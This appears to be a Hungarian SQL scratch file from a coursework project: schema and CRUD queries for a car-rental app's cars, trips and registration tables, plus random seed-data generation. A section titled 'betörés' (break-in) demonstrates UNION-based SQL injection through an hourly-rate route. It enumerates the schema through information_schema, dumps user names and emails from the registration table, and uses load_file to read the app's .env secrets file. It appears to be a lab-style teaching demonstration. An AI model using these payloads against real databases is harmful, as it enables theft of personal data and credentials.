CREATE DATABASE my_auth
	CHARACTER SET utf8
	COLLATE utf8_hungarian_ci;

#cars tábla
CREATE TABLE cars (
  id INT(11) NOT NULL AUTO_INCREMENT,
  name VARCHAR(50) DEFAULT NULL,
  licenseNumber VARCHAR(10) DEFAULT NULL,
  hourlyRate INT(11) DEFAULT NULL,
  PRIMARY KEY (id)
)
ENGINE = INNODB,
AUTO_INCREMENT = 6,
AVG_ROW_LENGTH = 4096,
CHARACTER SET utf8,
COLLATE utf8_hungarian_ci;


CREATE TABLE trips (
  id INT(11) NOT NULL AUTO_INCREMENT,
  numberOfMinutes INT(11) DEFAULT NULL,
  date INT(11) DEFAULT NULL,
  carId INT(11) DEFAULT NULL,
  PRIMARY KEY (id)
)
ENGINE = INNODB,
CHARACTER SET utf8,
COLLATE utf8_hungarian_ci;

ALTER TABLE trips 
  ADD CONSTRAINT FK_trips_cars_id FOREIGN KEY (carId)
    REFERENCES cars(id) ON DELETE CASCADE ON UPDATE CASCADE;

select * from registration;

# registration CRUD (user.services.js)

# create:
insert into registration
  (firstName, lastName, gender, email, password, number)
  values
  (?,?,?,?,?,?);

# getUserByUserEmail:
select * from registration where email = ?;

# getUsers
select * from registration;

# getUserByUserId
select * from registration where id=1;

# updateUser
update registration set 
   firstName=?, lastName=?, gender=?, email=?, password=?, number=?
   where id=?;

# deleteUser
delete from registration where id = ?


# getCars
select * from cars;

# getCarsABC
select name, id from cars
  order by name;


# getCarById
select * from cars
  WHERE id = 1;


# createCar
INSERT INTO cars
  (name,licenseNumber,hourlyRate)
  VALUES
  ("Merci2", "MMM-222", 4000);

# updateUser
UPDATE cars set
  name="Merci3", licenseNumber="MMM-333", hourlyRate=5000
  where id= 2;

# Trips CRUD
# getTrips
select * from trips; 

# getTripsCar (/tripscar)
  select t.id, t.numberOfMinutes, DATE_FORMAT(t.date, "%Y.%m.%d %H:%i") date, CONCAT(c.name,' - ',c.licenseNumber), c.id carId from trips t
    inner join cars c on c.id = t.carId
    order by t.date DESC;

# getTripsById (/tripsbyid)
select id, numberOfMinutes, DATE_FORMAT(date, "%Y-%m-%dT%H:%i") date, carId from trips
  WHERE id = 1; 


# getTripsByCarId
select id, numberOfMinutes, DATE_FORMAT(date, "%Y.%m.%d %h:%i") date, carId from trips
  WHERE carId = 1; 

# createTrip
INSERT INTO trips
  (numberOfMinutes, date, carId)
  VALUES
  (30, '2011.12.18 13:17:17', 1);

# updateTrip
UPDATE trips SET
  numberOfMinutes = 20, date='2011.12.18 13:17:17', carId=2
  where id = 2;

# deleteTrip
delete FROM trips
  where id = 12;



# betörés
select * from cars;
# router.get("/carshrst/:hourlyRate", checkToken, getCarByHourlyRate);

select * from cars where hourlyRate<5000;


# adatbázis neve
  select * from cars where hourlyRate<5000 union select database(), '', '', '';

# milyen táblák vannak
select * from cars where hourlyRate<5000 union select table_name, '','', '' from information_schema.tables where table_schema='my_auth';


# registration tábla adatai
select column_name, data_type,'', '' from information_schema.columns where table_name='registration';

select * from cars where hourlyRate<5000 union select column_name, data_type,'', '' from information_schema.columns where table_name='registration';

select * from cars where hourlyRate<5000 union select column_name, '', '', '' from information_schema.columns where table_name='registration';
select * from cars where hourlyRate<5000 union select data_type, '', '', '' from information_schema.columns where table_name='registration';

# ez jó
select * from cars where hourlyRate<5000 union select data_type, '', '', column_name from information_schema.columns where table_name='registration';

# adatlopás a registration táblából
select * from cars where hourlyRate<5000 union select firstName, lastName, email, gender from registration;



//Fájl tartalmának kiolvasása
 select load_file('D:\\zzz\\authWithMysql\\.env') file; 

delete from cars;

# adatgenerálás
insert into cars
  (id, name, licenseNumber, hourlyRate)
  VALUES
  (1, 'Merci1', 'MMM-111', 4000),
  (2, 'Merci2', 'MMM-222', 4200),
  (3, 'Fiat1', 'FFF-111', 3100),
  (4, 'Fiat2', 'FFF-222', 3200),
  (5, 'Fiat3', 'FFF-333', 3300),
  (6, 'BMW1', 'BBB-111', 5100),
  (7, 'BMW2', 'BBB-222', 5200);

# véletlenszám: FLOOR((RAND() * (max-min+1))+min)
  select FLOOR((RAND() * (50-5+1))+5);

# véletlen most
SET @MIN = '2010-04-30 14:53:27';
SET @MAX = '2012-04-30 14:53:27';
#SELECT TIMESTAMPADD(SECOND, FLOOR(RAND() * TIMESTAMPDIFF(SECOND, @MIN, @MAX)), @MIN);

select TIMESTAMPADD(SECOND, FLOOR(RAND() * TIMESTAMPDIFF(SECOND,'2010-04-30 14:53:27', '2012-04-30 14:53:27')), '2010-04-30 14:53:27');


insert into trips
  (numberOfMinutes, date, carId)
  values
  (
    FLOOR((RAND() * (50-5+1))+5),
    TIMESTAMPADD(SECOND, FLOOR(RAND() * TIMESTAMPDIFF(SECOND,'2010-04-30 14:53:27', '2012-04-30 14:53:27')), '2010-04-30 14:53:27'),
    FLOOR((RAND() * (7-1+1))+1)
  );

delete from trips;

select * from cars;
select * from trips;

call hello();

call cars_trips_gen();

